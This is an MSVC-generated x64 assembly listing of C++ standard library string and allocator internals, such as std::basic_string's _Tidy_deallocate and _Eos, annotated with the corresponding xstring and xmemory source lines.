; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
_Result$ = 32
this$ = 64
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2269 :     _CONSTEXPR20 const value_type* _Myptr() const noexcept {

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 2270 :         const value_type* _Result = _Bx._Buf;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _Result$[rsp], rax

; 2271 :         if (_Large_string_engaged()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_string_engaged
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN2@Myptr

; 2272 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>
	mov	QWORD PTR _Result$[rsp], rax
$LN2@Myptr:

; 2273 :         }
; 2274 : 
; 2275 :         return _Result;

	mov	rax, QWORD PTR _Result$[rsp]

; 2276 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >, COMDAT

; 2249 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty

; 2250 : 
; 2251 :     // length of internal buffer, [1, 16]:
; 2252 :     static constexpr size_type _BUF_SIZE = 16 / sizeof(value_type) < 1 ? 1 : 16 / sizeof(value_type);
; 2253 :     // roundup mask for allocated buffers, [0, 15]:
; 2254 :     static constexpr size_type _ALLOC_MASK = sizeof(value_type) <= 1 ? 15
; 2255 :                                            : sizeof(value_type) <= 2 ? 7
; 2256 :                                            : sizeof(value_type) <= 4 ? 3
; 2257 :                                            : sizeof(value_type) <= 8 ? 1
; 2258 :                                                                      : 0;
; 2259 : 
; 2260 :     _CONSTEXPR20 value_type* _Myptr() noexcept {
; 2261 :         value_type* _Result = _Bx._Buf;
; 2262 :         if (_Large_string_engaged()) {
; 2263 :             _Result = _Unfancy(_Bx._Ptr);
; 2264 :         }
; 2265 : 
; 2266 :         return _Result;
; 2267 :     }
; 2268 : 
; 2269 :     _CONSTEXPR20 const value_type* _Myptr() const noexcept {
; 2270 :         const value_type* _Result = _Bx._Buf;
; 2271 :         if (_Large_string_engaged()) {
; 2272 :             _Result = _Unfancy(_Bx._Ptr);
; 2273 :         }
; 2274 : 
; 2275 :         return _Result;
; 2276 :     }
; 2277 : 
; 2278 :     _CONSTEXPR20 bool _Large_string_engaged() const noexcept {
; 2279 : #if _HAS_CXX20
; 2280 :         if (_STD is_constant_evaluated()) {
; 2281 :             return true;
; 2282 :         }
; 2283 : #endif // _HAS_CXX20
; 2284 :         return _BUF_SIZE <= _Myres;
; 2285 :     }
; 2286 : 
; 2287 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {
; 2288 :         // checks whether _Off is in the bounds of [0, size()]
; 2289 :         if (_Mysize < _Off) {
; 2290 :             _Xran();
; 2291 :         }
; 2292 :     }
; 2293 : 
; 2294 :     _CONSTEXPR20 void _Check_offset_exclusive(const size_type _Off) const {
; 2295 :         // checks whether _Off is in the bounds of [0, size())
; 2296 :         if (_Mysize <= _Off) {
; 2297 :             _Xran();
; 2298 :         }
; 2299 :     }
; 2300 : 
; 2301 :     [[noreturn]] static void _Xran() {
; 2302 :         _Xout_of_range("invalid string position");
; 2303 :     }
; 2304 : 
; 2305 :     _CONSTEXPR20 size_type _Clamp_suffix_size(const size_type _Off, const size_type _Size) const noexcept {
; 2306 :         // trims _Size to the longest it can be assuming a string at/after _Off
; 2307 :         return (_STD min)(_Size, _Mysize - _Off);
; 2308 :     }
; 2309 : 
; 2310 :     union _Bxty { // storage for small buffer or pointer to larger one
; 2311 :         _CONSTEXPR20 _Bxty() noexcept : _Ptr() {} // user-provided, for fancy pointers
; 2312 : 
; 2313 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2314 : 
; 2315 :         value_type _Buf[_BUF_SIZE];
; 2316 :         pointer _Ptr;
; 2317 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2318 :     } _Bx;
; 2319 : 
; 2320 :     size_type _Mysize = 0; // current length of string

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+16], 0

; 2321 :     size_type _Myres  = 0; // current storage reserved for string

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+24], 0

; 2249 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 8
_Al$ = 16
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction, COMDAT

; 699  :     _NODISCARD static _CONSTEXPR20 _Alloc select_on_container_copy_construction(const _Alloc& _Al) {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 700  :         return _Al;

	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 701  :     }

	ret	0
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
_TEXT	SEGMENT
__formal$ = 8
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size, COMDAT

; 695  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 696  :         return static_cast<size_t>(-1) / sizeof(value_type);

	mov	rax, 9223372036854775807		; 7fffffffffffffffH

; 697  :     }

	ret	0
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
_TEXT	SEGMENT
this$ = 48
_Count$ = 56
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z PROC	; std::allocator<wchar_t>::allocate, COMDAT

; 835  :     _NODISCARD _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 836  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 837  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

	mov	rcx, QWORD PTR _Count$[rsp]
	call	??$_Get_size_of_n@$01@std@@YA_K_K@Z	; std::_Get_size_of_n<2>
	mov	rcx, rax
	call	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>

; 838  :     }

	add	rsp, 40					; 00000028H
	ret	0
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ENDP	; std::allocator<wchar_t>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
_TEXT	SEGMENT
this$ = 48
_Ptr$ = 56
_Count$ = 64
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z PROC	; std::allocator<wchar_t>::deallocate, COMDAT

; 829  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 830  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 831  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 832  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, QWORD PTR _Count$[rsp]
	shl	rax, 1
	mov	rdx, rax
	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ; std::_Deallocate<16,0>

; 833  :     }

	add	rsp, 40					; 00000028H
	ret	0
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ENDP	; std::allocator<wchar_t>::deallocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??0?$allocator@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$allocator@_W@std@@QEAA@XZ PROC			; std::allocator<wchar_t>::allocator<wchar_t>, COMDAT

; 821  :     constexpr allocator() noexcept {}

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$allocator@_W@std@@QEAA@XZ ENDP			; std::allocator<wchar_t>::allocator<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::~_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??1?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::~_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first, COMDAT

; 1386 :     constexpr const _Ty1& _Get_first() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1387 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1388 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first, COMDAT

; 1382 :     constexpr _Ty1& _Get_first() noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1383 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1384 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBAAEBV?$allocator@D@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBAAEBV?$allocator@D@2@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal, COMDAT

; 4935 :     _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4936 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first

; 4937 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBAAEBV?$allocator@D@2@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal, COMDAT

; 4931 :     _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4932 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first

; 4933 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
this$ = 48
_Right$ = 56
?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators, COMDAT

; 4927 :     _CONSTEXPR20 void _Swap_proxy_and_iterators(basic_string& _Right) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4928 :         _Mypair._Myval2._Swap_proxy_and_iterators(_Right._Mypair._Myval2);

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rdx, rax
	call	?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators

; 4929 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ
_TEXT	SEGMENT
$T1 = 32
_My_data$ = 40
_Ptr$2 = 48
_Al$3 = 56
this$ = 80
?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate, COMDAT

; 4892 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 4893 :         auto& _My_data = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 4894 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4895 :         _ASAN_STRING_REMOVE(*this);
; 4896 :         if (_My_data._Large_string_engaged()) {

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_string_engaged
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN2@Tidy_deall

; 4897 :             const pointer _Ptr = _My_data._Bx._Ptr;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR _Ptr$2[rsp], rax

; 4898 :             auto& _Al          = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	QWORD PTR _Al$3[rsp], rax

; 4899 :             _Destroy_in_place(_My_data._Bx._Ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, rax
	call	??$_Destroy_in_place@PEAD@std@@YAXAEAPEAD@Z ; std::_Destroy_in_place<char *>

; 4900 : #if _HAS_CXX20
; 4901 :             if (_STD is_constant_evaluated()) { // begin the lifetime of the array elements before copying into them
; 4902 :                 _Construct_in_place(_My_data._Bx);
; 4903 :             }
; 4904 : #endif // _HAS_CXX20
; 4905 :             _Al.deallocate(_Ptr, _My_data._Myres + 1);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rax, QWORD PTR [rax+24]
	inc	rax
	mov	r8, rax
	mov	rdx, QWORD PTR _Ptr$2[rsp]
	mov	rcx, QWORD PTR _Al$3[rsp]
	call	?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z ; std::allocator<char>::deallocate
$LN2@Tidy_deall:

; 4906 :         }
; 4907 : 
; 4908 :         _My_data._Mysize = 0;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+16], 0

; 4909 : #if _HAS_CXX20
; 4910 :         if (_STD is_constant_evaluated()) {
; 4911 :             _My_data._Myres = 0;
; 4912 :         } else
; 4913 : #endif // _HAS_CXX20
; 4914 :         {
; 4915 :             _My_data._Myres = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 15

; 4916 :             // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4917 :             _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	eax, 1
	imul	rax, rax, 0
	mov	rcx, QWORD PTR _My_data$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign
	npad	1

; 4918 :         }
; 4919 :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ
_TEXT	SEGMENT
$T1 = 32
_My_data$ = 40
this$ = 64
?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_init, COMDAT

; 4868 :     _CONSTEXPR20 void _Tidy_init() noexcept { // initialize basic_string data members

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 4869 :         auto& _My_data   = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 4870 :         _My_data._Mysize = 0;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+16], 0

; 4871 : 
; 4872 : #if _HAS_CXX20
; 4873 :         if (_STD is_constant_evaluated()) {
; 4874 :             _My_data._Myres        = _BUF_SIZE; // SSO disabled in constexpr context
; 4875 :             auto& _Al              = _Getal();
; 4876 :             const pointer _New_ptr = _Al.allocate(_BUF_SIZE + 1); // throws
; 4877 :             _My_data._Bx._Ptr      = _New_ptr;
; 4878 : 
; 4879 :             _Elem* const _Raw_new = _Unfancy(_New_ptr);
; 4880 :             _Traits::assign(_Raw_new, _BUF_SIZE + 1, _Elem());
; 4881 :         } else
; 4882 : #endif // _HAS_CXX20
; 4883 :         {
; 4884 :             _My_data._Myres = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 15

; 4885 :             // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4886 :             _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	eax, 1
	imul	rax, rax, 0
	mov	rcx, QWORD PTR _My_data$[rsp]
	add	rcx, rax
	mov	rax, rcx
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 4887 :         }
; 4888 : 
; 4889 :         _ASAN_STRING_CREATE(*this);
; 4890 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_init
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAX_K@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_New_size$ = 72
?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAX_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Eos, COMDAT

; 4863 :     _CONSTEXPR20 void _Eos(const size_type _New_size) { // set new length and null terminator

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 4864 :         _ASAN_STRING_MODIFY(static_cast<difference_type>(_New_size - _Mypair._Myval2._Mysize));
; 4865 :         _Traits::assign(_Mypair._Myval2._Myptr()[_Mypair._Myval2._Mysize = _New_size], _Elem());

	mov	BYTE PTR $T1[rsp], 0
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _New_size$[rsp]
	mov	QWORD PTR [rax+16], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	add	rax, QWORD PTR _New_size$[rsp]
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign

; 4866 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAX_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Eos
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 48
_Requested$ = 56
?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth, COMDAT

; 4763 :     _NODISCARD _CONSTEXPR20 size_type _Calculate_growth(const size_type _Requested) const noexcept {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 4764 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
	mov	r8, rax
	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+24]
	mov	rcx, QWORD PTR _Requested$[rsp]
	call	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CA_K_K00@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth

; 4765 :     }

	add	rsp, 40					; 00000028H
	ret	0
